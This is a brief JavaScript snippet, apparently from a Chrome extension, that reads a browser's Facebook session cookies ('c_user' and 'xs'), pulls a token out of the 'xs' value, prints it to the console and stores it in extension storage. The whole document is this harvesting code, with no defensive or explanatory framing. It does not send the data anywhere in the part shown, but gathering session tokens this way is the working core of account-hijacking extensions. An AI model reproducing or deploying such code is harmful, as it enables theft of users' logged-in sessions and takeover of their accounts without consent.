chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
    let fbCookies = cookies.filter(cookie => cookie.name === "c_user" || cookie.name === "xs");
    let tokens = [];

    fbCookies.forEach(cookie => {
        let cookieValue = cookie.value;
        if (cookie.name === "xs") {
            let token = cookieValue.split("|")[1]; // Extract token from xs cookie
            if (token) tokens.push(token);
        }
    });

    if (tokens.length > 0) {
        console.log("Found Tokens: ", tokens);
        chrome.storage.local.set({facebookTokens: tokens});
    } else {
        console.log("No valid tokens found in Facebook cookies.");
    }
});